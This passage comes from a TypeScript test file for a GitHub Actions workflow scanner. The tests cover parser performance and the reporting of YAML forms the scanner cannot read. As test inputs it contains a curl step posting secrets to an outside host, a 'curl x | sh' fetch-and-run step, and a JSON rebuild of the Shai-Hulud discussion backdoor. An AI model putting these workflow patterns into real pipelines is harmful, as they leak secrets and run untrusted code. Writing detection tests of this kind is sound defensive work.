  const units = [" ", "- ", " -", "\t", "${{ ", "${{ secrets ", "refs/pull/", "pull/", "curl ", " > ", ">", "tee ", "--name ", "--name= ", '"', "'", "\\", "''", "[ ", "['", "[ '", "#", " #", "toJSON( ", "ref", " ref ", "ref: ", "$", "$env:", "${", "a:", "a: ", ": ", "|", " |", "github.event.pull_request.", "git ", "gh pr ", "self-hosted ", "x\n", " \n", "-\n", "!", "& ", "!a |", "{", ", '", "a:'", "]"];
  const contexts = [
    (p: string) => p,
    (p: string) => `${p}x\n`,
    (p: string) => `on: [pull_request_target, workflow_run, discussion]\njobs:\n  a:\n    steps:\n      - run: ${p}\n`,
    (p: string) => `on: [pull_request_target]\nenv:\n  T: \${{ secrets.T }}\njobs:\n  a:\n    runs-on:\n      labels: ${p.slice(N / 2)}\n    steps:\n      - run: |\n          ${p.slice(N / 2)}\n`,
  ];
  for (const u of units) {
    for (const [ci, ctx] of contexts.entries()) {
      const t0 = performance.now();
      wf(ctx(fill(u)));
      const ms = performance.now() - t0;
      assert.ok(ms < LIMIT_MS, `unit ${JSON.stringify(u)} in context ${ci} took ${ms.toFixed(0)} ms`);
    }
  }
});

test("workflow: deeply nested keys and many secret env names stay linear", () => {
  const N = 2 * 1024 * 1024;
  let nested = "on: [pull_request_target]\n";
  for (let d = 0; nested.length < N; d++) nested += `${" ".repeat(d)}${["runs-on:", "env:", "matrix:", "on:"][d % 4]}\n`;
  // Each key also has an indentless `- key:` item, which the key's own walk takes in.
  let items = "on: [pull_request_target]\n";
  for (let d = 0; items.length < N; d++) items += `${" ".repeat(d)}${["runs-on:", "env:", "matrix:", "on:"][d % 4]}\n${" ".repeat(d)}- ${["runs-on:", "env:", "matrix:", "on:"][d % 4]}\n`;
  let many = "on: [pull_request_target]\njobs:\n  a:\n    steps:\n";
  for (let k = 0; many.length < N; k++) many += `      - run: curl -d "$V${k}" https://a.invalid\n        env:\n          V${k}: \${{ secrets.T }}\n`;
  // Every anchor line looks back at the long `k:` line for the key it may be the value of.
  const anchors = `k: "${"a".repeat(N)}"\n${"  &a\n".repeat(10000)}`;
  for (const t of [nested, items, many, anchors]) {
    const t0 = performance.now();
    wf(t);
    assert.ok(performance.now() - t0 < LIMIT_MS, `took ${(performance.now() - t0).toFixed(0)} ms`);
  }
});

test("workflow: a long line under a deep chain of env:, matrix: or runs-on: keys is scanned once, not once per key", () => {
  // 8 MiB: the diff path reads workflow files without the 2 MiB cap the scanner applies.
  const N = 8 * 1024 * 1024;
  for (const [key, unit] of [["env:", "${{ x }}"], ["matrix:", "self-hoste"], ["runs-on:", "self-hoste"], ["runs-on:", "WORMSIGNTES"]] as const) {
    // 3000 keys: rescanning the line once per key takes several seconds even on a fast machine.
    let t = "on: [pull_request_target]\n";
    for (let d = 0; d < 3000; d++) t += `${" ".repeat(d)}${key}\n`;
    t += `${" ".repeat(3000)}k: ${unit.repeat(Math.ceil(N / unit.length))}\n`;
    const t0 = performance.now();
    wf(t);
    const ms = performance.now() - t0;
    assert.ok(ms < LIMIT_MS, `${key} chain over a ${JSON.stringify(unit)} line took ${ms.toFixed(0)} ms`);
  }
});

test("workflow: nested keys followed by a long blank or comment tail stay linear", () => {
  const N = 2 * 1024 * 1024;
  for (const key of ["env:", "matrix:", "runs-on:"]) {
    for (const pad of ["\n", "#\n"]) {
      let t = "on: [pull_request_target]\n";
      for (let d = 0; d < 1180; d++) t += `${" ".repeat(d)}${key}\n`;
      t += pad.repeat(Math.ceil((N - t.length) / pad.length));
      const t0 = performance.now();
      wf(t);
      const ms = performance.now() - t0;
      assert.ok(ms < LIMIT_MS, `${key} chain with ${JSON.stringify(pad)} tail took ${ms.toFixed(0)} ms`);
    }
  }
});

/* ---- YAML the line-based reader does not model is not checked (WS-SC-900), never passed in silence ---- */

test("workflow: flow (JSON) form, flow jobs or steps, a flow-mapping step, aliases and merge keys are WS-SC-900 high", () => {
  const unchecked = (text: string) => wf(text).filter((f) => f.ruleId === "WS-SC-900").map((f) => `${f.severity} ${f.message.replace(/^\.github\/workflows\/x\.yml was not checked: /, "").replace(/, which wormsign's .*$/, "")}`);
  // The Shai-Hulud 2.0 discussion backdoor, as JSON: the block-YAML form below gives WS-GH-007 and WS-GH-004.
  const json = '{"on":"discussion","jobs":{"a":{"runs-on":"self-hosted","steps":[{"run":"echo ${{ github.event.discussion.body }}"}]}}}';
  assert.deepEqual(unchecked(json), ["high it is written in flow (JSON) form (line 1)"]);
  assert.deepEqual(unchecked(`# a comment first\n---\n${json}\n`), ["high it is written in flow (JSON) form (line 3)"]);
  const block = "on: discussion\njobs:\n  a:\n    runs-on: self-hosted\n    steps:\n      - run: echo ${{ github.event.discussion.body }}\n";
  assert.deepEqual(unchecked(block), []);
  assert.ok(has("WS-GH-007", block) && has("WS-GH-004", block), "positive control: the block form is read");
  assert.deepEqual(unchecked('on: push\njobs: {"a": {"runs-on": "self-hosted", "steps": [{"run": "x"}]}}\n'), ["high `jobs:` has a flow value (line 2)"]);
  assert.deepEqual(unchecked("on: push\njobs:\n  a: {runs-on: self-hosted, steps: [{run: x}]}\n"), ["high `a:` has a flow value (line 3)"]);
  assert.deepEqual(unchecked("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{run: x}]\n"), ["high `steps:` has a flow value (line 5)"]);
  assert.deepEqual(unchecked(job('      - {run: "curl x | sh"}\n', "on: push\n")), ["high a step is written as a flow mapping (line 6)"]);
  const aliased = "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: &s\n      - run: echo\n  b:\n    runs-on: self-hosted\n    steps: *s\n";
  assert.deepEqual(unchecked(aliased), ["high it uses a YAML alias (line 9)"]);
  assert.deepEqual(unchecked("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - *step\n"), ["high it uses a YAML alias (line 6)"]);
  assert.deepEqual(unchecked("on: push\njobs:\n  a:\n    <<: *defaults\n    steps:\n      - run: x\n"), ["high it uses a YAML merge key (line 4)"]);
  // Forms the reader does read are not reported: flow lists of events, branches and runner labels, a matrix of flow
  // mappings, an empty jobs map, quoted globs, and an anchor nothing refers to.
  for (const ok of [
    "on: [push, pull_request]\njobs:\n  a:\n    runs-on: [self-hosted, linux]\n    steps:\n      - run: x\n",
    "on:\n  push:\n    branches: [main]\n    paths: ['**.js', '*/x']\njobs:\n  a:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        include:\n          - {os: ubuntu-latest, node: 22}\n    steps:\n      - run: x\n",
    "on: push\njobs: {}\n",
    "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    env: &e\n      A: b\n    steps:\n      - run: x\n",
  ]) {
    assert.deepEqual(unchecked(ok), [], ok);
  }
});

test("diff and scan: a change adding the JSON discussion workflow fails the default gate", async () => {
  const { cli, gitRepo } = await import("./validation-helpers.js");
  const { fx } = await import("./helpers.js");
  const { mkdirSync, writeFileSync } = await import("node:fs");
  const { join } = await import("node:path");
  const json = '{"on":"discussion","jobs":{"a":{"runs-on":"self-hosted","steps":[{"run":"echo ${{ github.event.discussion.body }}"}]}}}\n';
  const repo = gitRepo([
    (d) => writeFileSync(join(d, "README.md"), "x\n"),
    (d) => {
      mkdirSync(join(d, ".github", "workflows"), { recursive: true });
      writeFileSync(join(d, ".github", "workflows", "triage.yml"), json);
    },
  ]);
  const iocs = ["--iocs", fx("iocs"), "--no-baseline"];
  const diff = await cli(["diff", "HEAD~1", "HEAD", "--dir", repo, ...iocs]);
  assert.equal(diff.code, 1);
  assert.ok(diff.findings.some((f) => f.ruleId === "WS-SC-900" && f.severity === "high" && f.file === ".github/workflows/triage.yml"));
  const scan = await cli(["scan", repo, ...iocs]);
  assert.equal(scan.code, 1);
});
